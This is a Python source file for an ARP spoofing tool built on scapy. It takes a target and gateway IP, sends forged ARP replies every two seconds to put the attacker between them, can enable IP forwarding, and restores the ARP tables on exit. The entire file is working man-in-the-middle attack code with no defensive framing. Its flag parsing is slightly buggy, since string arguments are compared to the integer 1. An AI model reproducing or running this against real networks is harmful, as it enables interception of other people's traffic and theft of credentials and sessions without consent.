import scapy.all as scapy
import time
import subprocess
import sys
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    parser.add_argument("-i", "--interface", dest = "interface", default="eth0", help = "Interface")
    parser.add_argument("-f", "--forwarding", dest = "ip_forwarding", default=0, help = "IP forwarding active")
    parser.add_argument("-v", "--verbose", dest = "verbose_mode", default=0, help = "Versbose mode 0/1")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please specify an IP Address for the target")
    elif not options.gateway_ip:
        parser.error("Please specify an IP Address for the gateway")
    return options

def get_mac(ip):
    if verbose:
        print(f"Getting mac for ip: {ip}")
    arp_req_frame = scapy.ARP(pdst = ip)
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    if verbose:
        print(f"Spoofing target ip: {target_ip}")
        print(f"Spoof ip: {spoof_ip}")
    target_mac = get_mac(target_ip)
    spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc=attacker_mac)
    scapy.send(spoof_packet, verbose = False)

def restore(source_ip, destination_ip):
    if verbose:
        print("Restoring arp tables")
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)

def enable_ip_forwarding():
    try:
        if sys.platform.startswith('linux'):
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True, capture_output=True)
            if verbose:
                print("Ip forwarding enabled")
    except subprocess.CalledProcessError as e:
        print(f"Error enabling IP forwarding: {e}")

def disable_ip_forwarding():
    try:
        if sys.platform.startswith('linux'):
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], check=True, capture_output=True)
            if verbose:
                print("Ip forwarding disabled")
    except subprocess.CalledProcessError as e:
        print(f"Error disabling IP forwarding: {e}")


packets_sent = 0

options = get_args()
target_ip = options.target_ip
gateway_ip = options.gateway_ip
interface = options.interface
ip_forwarding = True if options.ip_forwarding == 1 else False
verbose = True if options.verbose_mode == 1 else False
attacker_mac = scapy.get_if_hwaddr(interface)

try:
    if ip_forwarding:
        enable_ip_forwarding()
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent += 2
        print("Packets Sent: {}".format(packets_sent), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\nRestoring the ARP Tables")
    disable_ip_forwarding()
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)